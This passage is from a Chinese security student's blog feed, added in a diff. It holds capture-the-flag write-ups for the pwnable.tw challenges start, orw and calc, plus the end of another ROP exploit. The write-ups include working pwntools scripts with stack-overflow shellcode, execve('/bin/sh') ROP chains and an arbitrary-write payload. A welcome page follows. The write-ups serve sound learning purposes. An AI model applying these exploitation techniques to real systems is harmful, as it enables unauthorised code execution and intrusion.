+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvrepeatS</span><span class="p">(</span><span class="mf">0.5</span><span class="p">))</span>
+
+<span class="c1"># addr
+</span><span class="n">fini_array_addr</span> <span class="o">=</span> <span class="mh">0x4b40f0</span>
+<span class="n">new_stack_addr</span> <span class="o">=</span> <span class="n">fini_array_addr</span> <span class="o">+</span> <span class="mh">0x10</span>
+<span class="n">csu_fini_addr</span> <span class="o">=</span> <span class="mh">0x402960</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x401b6d</span>
+<span class="n">sh_str_addr</span> <span class="o">=</span> <span class="mh">0x4b40e0</span>   <span class="c1"># 随便取的
+</span>
+<span class="c1"># ROP gadget
+</span><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x0041e4af</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00401696</span>
+<span class="n">pop_rdx_rsi</span> <span class="o">=</span> <span class="mh">0x0044a309</span>
+<span class="n">mov_rax_val</span> <span class="o">=</span> <span class="mh">0x0044f62b</span>
+<span class="n">leave</span> <span class="o">=</span> <span class="mh">0x00401c4b</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x00471db5</span>
+<span class="n">return_</span> <span class="o">=</span> <span class="mh">0x00401016</span>    <span class="c1"># just a normal ret，用来占位子
+</span>
+<span class="c1"># ROP payload
+</span><span class="n">payload1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">sh_str_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rdx_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># pwn
+</span><span class="n">write</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">csu_fini_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">main_addr</span><span class="p">))</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">sh_str_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+<span class="n">write</span><span class="p">(</span><span class="n">new_stack_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
+
+<span class="n">write</span><span class="p">(</span><span class="n">fini_array_addr</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">leave</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">return_</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">))</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>一个小技巧：
+如果不间断地给程序数据，很可能send到同一个 <code class="language-plaintext highlighter-rouge">read()</code> 里。
+面对这种情况，可以在两个 <code class="language-plaintext highlighter-rouge">send()</code> 中间 <code class="language-plaintext highlighter-rouge">recv()</code> 一下，又或者加上一个 <code class="language-plaintext highlighter-rouge">pause()</code> 手动停止，又或者加上一个 <code class="language-plaintext highlighter-rouge">sleep(0.15)</code> 来自动停止。</p>]]></content><author><name></name></author><summary type="html"><![CDATA[好难的一关，顺着这关学了好多东西……]]></summary></entry><entry><title type="html">pwnable.tw start/orw/calc</title><link href="http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html" rel="alternate" type="text/html" title="pwnable.tw start/orw/calc" /><published>2022-08-04T04:10:47+08:00</published><updated>2022-08-04T04:10:47+08:00</updated><id>http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup</id><content type="html" xml:base="http://localhost:4001/2022/08/04/pwnable-tw-start-orw-calc-writeup.html"><![CDATA[<h2 id="start">start</h2>
+
+<p><strong>保护全关</strong>的32位程序。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>objdump <span class="nt">-d</span> <span class="nt">-M</span> Intel ./start 
+
+./start:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	54                   	push   %esp
+ 8048061:	68 9d 80 04 08       	push   <span class="nv">$0x804809d</span>
+ 8048066:	31 c0                	xor    %eax,%eax
+ 8048068:	31 db                	xor    %ebx,%ebx
+ 804806a:	31 c9                	xor    %ecx,%ecx
+ 804806c:	31 d2                	xor    %edx,%edx
+ 804806e:	68 43 54 46 3a       	push   <span class="nv">$0x3a465443</span>
+ 8048073:	68 74 68 65 20       	push   <span class="nv">$0x20656874</span>
+ 8048078:	68 61 72 74 20       	push   <span class="nv">$0x20747261</span>
+ 804807d:	68 73 20 73 74       	push   <span class="nv">$0x74732073</span>
+ 8048082:	68 4c 65 74 27       	push   <span class="nv">$0x2774654c</span>
+ 8048087:	89 e1                	mov    %esp,%ecx
+ 8048089:	b2 14                	mov    <span class="nv">$0x14</span>,%dl
+ 804808b:	b3 01                	mov    <span class="nv">$0x1</span>,%bl
+ 804808d:	b0 04                	mov    <span class="nv">$0x4</span>,%al
+ 804808f:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+ 8048091:	31 db                	xor    %ebx,%ebx
+ 8048093:	b2 3c                	mov    <span class="nv">$0x3c</span>,%dl
+ 8048095:	b0 03                	mov    <span class="nv">$0x3</span>,%al
+ 8048097:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+ 8048099:	83 c4 14             	add    <span class="nv">$0x14</span>,%esp
+ 804809c:	c3                   	ret    
+
+0804809d &lt;_exit&gt;:
+ 804809d:	5c                   	pop    %esp
+ 804809e:	31 c0                	xor    %eax,%eax
+ 80480a0:	40                   	inc    %eax
+ 80480a1:	<span class="nb">cd </span>80                	int    <span class="nv">$0x80</span>
+</code></pre></div></div>
+
+<p>有3个syscall，一个write把一个字符串写到1，一个read从0读入字符到栈上，一个exit退出。显然read这边有个栈溢出漏洞，可以把返回地址覆盖掉。</p>
+
+<p>首先想到直接在返回地址后面写一段shellcode执行execve(“/bin/sh”, 0, 0)，想盲打打中栈地址。但是试了几次发现即使是32位的程序，也有至少19个二进制位的随机变化，要十几个小时才能打中，于是算了。
+然后想ROP试试，但是怎么想也想不出方法。
+最后想到重新执行的思想，我可以<strong>重新执行write和read</strong>，把栈上的栈地址泄露出来，这样就可以把控制流精准控制成我的shellcode了。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process("./start")
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x14</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">mes</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">mes</span><span class="p">)</span>
+
+<span class="n">stack</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span> <span class="o">-</span> <span class="mi">4</span>
+<span class="n">shcode_addr</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0x14</span> <span class="o">+</span> <span class="mi">4</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">13</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">shcode_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">'''
+mov eax, 11
+mov ebx, </span><span class="si">{</span><span class="n">stack</span><span class="si">}</span><span class="s">
+mov ecx, 0
+mov edx, 0
+int 0x80
+'''</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="orw">orw</h2>
+
+<p>程序会读入一段shellcode并执行，并且限制syscall只能调用orw。
+先用read读入/home/orw/flag，然后orw就好了。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process(["strace", "./orw"])
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x0804A0C0</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="sa">f</span><span class="s">'''
+mov eax, 3
+xor ebx, ebx
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 20
+int 0x80
+
+mov eax, 5
+mov ebx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+xor ecx, ecx
+xor edx, edx
+int 0x80
+
+mov ebx, eax
+mov eax, 3
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 50
+int 0x80
+
+mov eax, 4
+mov ebx, 1
+mov ecx, </span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
+mov edx, 50
+int 0x80
+'''</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'/home/orw/flag'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="calc">calc</h2>
+
+<p>除了PIE，其他保护全开。
+是一个计算器，将读入的表达式转换成逆波兰表达法之后，用栈进行求值。</p>
+
+<p>主要漏洞在于，在利用栈进行求值的时候，这个存数字的栈用[0]存储栈的高度，用[1]及以上空间存储数字。
+所以当我输入 <code class="language-plaintext highlighter-rouge">+1</code> 的时候，这个1将会直接被加到栈的高度上，之后就可以通过修改栈高度+构造表达式。来达成栈以上地址任意读写（实际只用到了任意写）。</p>
+
+<p>遇到了两个坑，一是写入一个数字的时候，比这个数字低位的数字将会受到影响；二是运算数不能为0。</p>
+
+<p>前者利用倒过来写入（从上往下写）解决，后者我利用构造表达式解决（后来发现了更简单的方法，由于是将运算数与”0”进行strcmp来判断的，我可以输入000来表示0）。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+
+<span class="c1"># p = process(["strace", "./calc"])
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10100</span><span class="p">)</span>
+
+<span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0806e6d0</span>
+<span class="n">buf_addr</span> <span class="o">=</span> <span class="mh">0x080ecf00</span>
+
+<span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08070880</span>
+<span class="n">sh_str</span> <span class="o">=</span> <span class="mh">0x08051ce9</span>
+<span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x0805c34b</span>
+<span class="n">pop_ecx_ebx</span> <span class="o">=</span> <span class="mh">0x080701d1</span>
+<span class="n">pop_edx</span> <span class="o">=</span> <span class="mh">0x080701aa</span>
+<span class="n">pop_3</span> <span class="o">=</span> <span class="mh">0x080483ac</span>
+
+<span class="c1"># 360 read
+# 361 0
+# 362 buf
+# 363 10
+</span>
+<span class="c1"># 364 pop_eax
+# 365 11
+# 366 pop_ecx_ebx
+# 367 0
+# 368 sh_str
+# 369 pop_edx
+# 370 0
+# 371 int_0x80
+</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'''+371+</span><span class="si">{</span><span class="n">int_0x80</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">int_0x80</span><span class="si">}</span><span class="s">
++370+</span><span class="si">{</span><span class="n">pop_edx</span><span class="si">}</span><span class="s">
++368+</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
++367+</span><span class="si">{</span><span class="n">pop_ecx_ebx</span><span class="si">}</span><span class="s">
++366+11
++365+</span><span class="si">{</span><span class="n">pop_eax</span><span class="si">}</span><span class="s">
++364+10
++362+</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">/1-</span><span class="si">{</span><span class="n">buf_addr</span><span class="si">}</span><span class="s">
++361+</span><span class="si">{</span><span class="n">pop_3</span><span class="si">}</span><span class="s">
++360+</span><span class="si">{</span><span class="n">read_addr</span><span class="si">}</span><span class="s">
+'''</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvS</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[start]]></summary></entry><entry><title type="html">Welcome Page</title><link href="http://localhost:4001/2022/07/16/Welcome.html" rel="alternate" type="text/html" title="Welcome Page" /><published>2022-07-16T04:26:53+08:00</published><updated>2022-07-16T04:26:53+08:00</updated><id>http://localhost:4001/2022/07/16/Welcome</id><content type="html" xml:base="http://localhost:4001/2022/07/16/Welcome.html"><![CDATA[<p><!--
+ ▄████▄   ▄▄▄       ███▄ ▄███▓▓█████  █    ██ ▓█████▄  ██▓  ██████ 
+▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒▓█   ▀  ██  ▓██▒▒██▀ ██▌▓██▒▒██    ▒ 
+▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░▒███   ▓██  ▒██░░██   █▌▒██▒░ ▓██▄   
+▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ▓▓█  ░██░░▓█▄   ▌░██░  ▒   ██▒
+▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒░▒████▒▒▒█████▓ ░▒████▓ ░██░▒██████▒▒
+░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░
+  ░  ▒     ▒   ▒▒ ░░  ░      ░ ░ ░  ░░░▒░ ░ ░  ░ ▒  ▒  ▒ ░░ ░▒  ░ ░
+░          ░   ▒   ░      ░      ░    ░░░ ░ ░  ░ ░  ░  ▒ ░░  ░  ░  
+░ ░            ░  ░       ░      ░  ░   ░        ░     ░        ░  
+░                                              ░
+--></p>
+
+<p>欢迎来到 Y² (aka Cameudis) 的博客！你可以在这里找到我写的一些技术相关博客。</p>
+
+<p>本站基于 Jekyll 和 Github Pages 搭建，使用 Valine 作为评论系统。</p>
+
+<p>这个博客始建于 2022 年 7 月，原始的欢迎页面如下：</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>欢迎页面，加上本站主的一些bb！</p>
+
+<p>站主目前是<strong>信息安全大二就读</strong>，比较萌新，但是对建站这种事情感到非常酷炫，我也要整一个，所以用hexo和Github Pages建了这个博客。</p>
+
+<p>本站点参考教程：
+<a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E4%BD%BF%E7%94%A8hexo%E5%86%99%E5%8D%9A%E5%AE%A2">使用hexo+github搭建免费个人博客详细教程 - 小茗同学</a></p>
+
+<p>hexo是一个静态网页生成框架，支持md渲染成网页，有各种主题可以选择，各种配置选项，详见官方文档。
+<a href="https://hexo.io/zh-cn/docs/">hexo官方中文文档</a>
+Github Pages是Github提供的静态网页托管服务，对于非商业用途免费。
+<a href="https://docs.github.com/cn/pages">GitHub Pages官方中文文档</a>
+评论使用Valine，教程请看<a href="https://cameudis.github.io/Tech/Blog/b9325487ff4b.html">使用Valine给Hexo博客添加评论功能</a>、以及<a href="https://github.com/DesertsP/Valine-Admin">Valine Admin - 评论邮件通知、评论管理、垃圾评论过滤等</a>
+加密使用hexo-blog-encrypt，教程请看<a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt/ReadMe_zh</a>
+主题使用butterfly，文档请看<a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 安裝文檔(一) 快速開始</a></p>
+
+<p>以及感谢nich0las学长告诉我可以这么玩！
+并且附上他的博客：<a href="https://nicholas-wei.github.io/">https://nicholas-wei.github.io/</a></p>
+
+<p>本人邮箱：Cameudis@gmail.com</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
